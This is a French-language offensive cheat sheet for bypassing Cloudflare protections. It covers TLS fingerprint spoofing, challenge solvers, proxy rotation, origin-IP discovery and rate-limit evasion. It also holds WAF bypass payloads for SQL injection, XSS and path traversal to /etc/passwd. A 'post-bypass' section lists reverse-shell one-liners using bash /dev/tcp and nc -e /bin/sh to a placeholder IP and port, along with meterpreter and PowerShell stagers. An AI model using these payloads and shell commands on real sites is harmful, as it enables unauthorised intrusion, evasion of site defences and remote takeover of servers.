# Techniques de Bypass Cloudflare

## Liste des techniques

### **1. Fingerprinting Bypass**

- TLS JA3/JA3S spoofing (curl_cffi, Chrome impersonation)
- User-Agent rotation (real browser UA pool)
- Canvas/WebGL fingerprint randomization
- HTTP/2 + QUIC headers légitimes
- Header order Chrome-like

### **2. JavaScript Challenge Bypass**

- undetected-chromedriver (headless Chrome++)
- Puppeteer-extra stealth plugin
- Playwright stealth mode
- FlareSolverr Docker service
- cfscrape/cloudscraper Python

### **3. IP & Proxy Rotation**

- Residential proxies (BrightData, Oxylabs, Smartproxy)
- Datacenter proxy pools (1000+ IPs)
- Mobile proxies (3G/4G rotation)
- Tor + proxy chaining
- AWS/GCP free tier instances

### **4. Origin IP Discovery**

- Historical DNS records (SecurityTrails, DNSDumpster)
- Certificate Transparency logs (crt.sh)
- Subdomain brute force → direct IPs
- Misconfigs (direct IP dans logs)
- BGP hijacking recon

### **5. WAF Bypass**

```txt
SQLi: ' OR 1=1--, 1'UNION/**/SELECT, %27%20OR%201%3D1--
XSS: <svg onload=alert(1)>, javascript:alert(1), {{7*7}}
Path traversal: ....//....//etc/passwd
```

### **6. Rate Limiting Bypass**

- Proxy pool distribution (1 req/proxy)
- Slowloris variant (low rate)
- Parameter pollution (?a=1&a=2)
- CDN edge hopping

### **7. Workers & Custom Logic Bypass**

- HTTP method fuzzing (OPTIONS, HEAD)
- Custom Host header (origin direct)
- Path normalization bypass
- Header injection (X-Forwarded-For)

### **8. Outils spécialisés**

```txt
cloudflare-bypass (Go)
FlareSolverr (Docker)
curl_cffi (Python TLS spoof)
undetected-chromedriver
cloudscraper
cf-clearance solver
```

### **9. Payloads Post-Bypass**

```txt
bash -i >& /dev/tcp/IP/PORT 0>&1
nc -e /bin/sh IP PORT
python3 reverse shell
powershell stageless
meterpreter stager
```

### **10. Advanced Evasion**

- ECH (Encrypted Client Hello) bypass
- 0-RTT disable
- Realistic traffic patterns (mouse moves)
- Session cookie reuse
- Referer chain légitime
